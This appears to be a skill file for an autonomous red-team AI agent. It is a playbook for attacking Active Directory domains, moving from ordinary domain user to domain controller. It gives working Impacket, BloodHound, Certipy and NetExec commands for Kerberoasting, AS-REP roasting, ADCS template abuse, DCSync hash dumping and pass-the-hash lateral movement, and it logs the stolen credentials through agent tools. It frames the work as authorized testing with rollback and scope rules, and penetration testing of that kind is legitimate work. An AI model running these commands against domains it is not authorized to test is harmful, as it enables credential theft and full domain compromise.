---
name: ad-attack
description: 【Internal】AD/domain environment attacks — domain user/host enumeration, Kerberoast/AS-REP, ACL and ADCS, DCSync, PtH/tickets, paths to domain control (Impacket / BloodHound / Certipy / NetExec)
whenToUse: When the internal network reveals a domain environment, domain accounts, a domain controller, or ADCS, and you need to move from an ordinary domain user to domain admin/domain control, or when judging what else the current privileges can reach
role: internal
category: Internal
tags: [ad, kerberos, bloodhound, adcs]
enabled: true
---

# AD / Domain Environment Attacks

> Only work on domains within the authorized scope. Domain controllers, ADCS, and ACLs are all high-value targets: **if read-only forensics is enough, do not write**; when you must change an ACL/template/group, back up the original value first and record the rollback method.

## Prerequisites and tools

| Tool | Path/install | Purpose |
| --- | --- | --- |
| Impacket suite | `/usr/bin/impacket-*` (Kali ships 61 commands) | Enumeration, Kerberos, DCSync, PtH |
| ldapsearch / enum4linux-ng | System package | LDAP / SMB enumeration |
| BloodHound + SharpHound / bloodhound-python | Official Release / pip, checksum-verified | ACLs and shortest paths to domain control |
| Certipy | pipx / official Release | ADCS templates and certificate attacks |
| NetExec (nxc) | pipx | SMB/LDAP/WinRM batch validation |
| Rubeus (Windows side) | Official Release | Ticket request/import |

When a tool is not installed, confirm first with `command -v`; if a tool is missing, write `needs` — do not hand-roll Kerberos/SMB protocol work.

## Enumeration (read-only first)

```bash
# Domain users / hosts / groups
impacket-GetADUsers <domain>/<user>:<pass> -dc-ip <DC_IP> -all
impacket-GetADComputers <domain>/<user>:<pass> -dc-ip <DC_IP>
ldapsearch -x -H ldap://<DC_IP> -D '<user>@<domain>' -w '<pass>' -b 'DC=<domain>,DC=<tld>' '(objectClass=user)' sAMAccountName memberOf

# BloodHound collection (start with All, narrow down later when the data volume is large)
bloodhound-python -u <user> -p '<pass>' -d <domain> -dc <DC_IP> -c All
```

- First check the domain accounts, hashes, and tickets already present in `redteam_credential_list` / `redteam_access_list`;
- Focus on: domain admin groups, ACL write permissions, Unconstrained/Constrained Delegation, ADCS templates, writable OUs, readable LAPS, hosts with SMB signing disabled.

## Common paths

1. **Kerberoast / AS-REP** (offline cracking, little traffic on the target side):
   ```bash
   impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <DC_IP> -request
   impacket-GetNPUsers <domain>/ -usersfile runs/users.txt -dc-ip <DC_IP> -format hashcat
   ```
2. **ADCS**: `certipy find -u <user>@<domain> -p '<pass>' -dc-ip <DC_IP> -vulnerable`; make only a minimal request against templates confirmed exploitable, and record any certificate/template change.
3. **ACL paths**: query `GenericAll/WriteDACL/ForceChangePassword/AddMember` in BloodHound; record the original ACL before changing permissions.
4. **DCSync**: only use `impacket-secretsdump -just-dc` once you hold replication rights/domain admin; do not dump the whole domain's hashes indiscriminately.
5. **PtH / tickets**: `impacket-wmiexec -hashes :<NThash>`, `getTGT`/`getST`; prefer WMI/atexec and use psexec sparingly (it drops a service on disk and is noisy).
6. **NTLM Relay / mitm6**: assess only when authorized and the target does not enforce SMB signing; this is a high-noise action — write the hypothesis and stop conditions first.

## Evidence and scoring

- Credentials/hashes/tickets: `redteam_credential_add` (`secret_type` set to ntlm/kerberos, `source` set to Kerberoast/AS-REP/DCSync/ACL);
- Logins/sessions: `redteam_access_add` (method=smb/winrm/ldap);
- Scoring: domain controller/bastion host/SSO/endpoint management → `central-system`; domain name/DNS control → `domain-control`; ordinary hosts → `server-host`; put the command into `command`/`result` of `redteam_score_hit`.
- High-value results (domain controller, ADCS) must be re-verified with a different command / fresh login.

## OPSEC and boundaries

- Check the domain account lockout policy first; throttle online attempts strictly and stop after 5 failures on the same account;
- Do not run interactive tools on a domain controller; run DCSync/secretsdump only when necessary and keep the export minimal;
- Do not create new domain admins, bulk-change passwords, or delete ACLs; any write operation requires a backup and a recorded rollback;
- Do not clean target logs; cleanup covers only files/sessions you uploaded (`redteam_cleanup`).

## Handoff

Report: domain structure, the privileges obtained (domain admin/local admin/ordinary domain user), usable tickets/hashes, the shortest path to the domain controller, and blocking points not yet broken through; write the missing tools/credentials/authorization into `needs`.
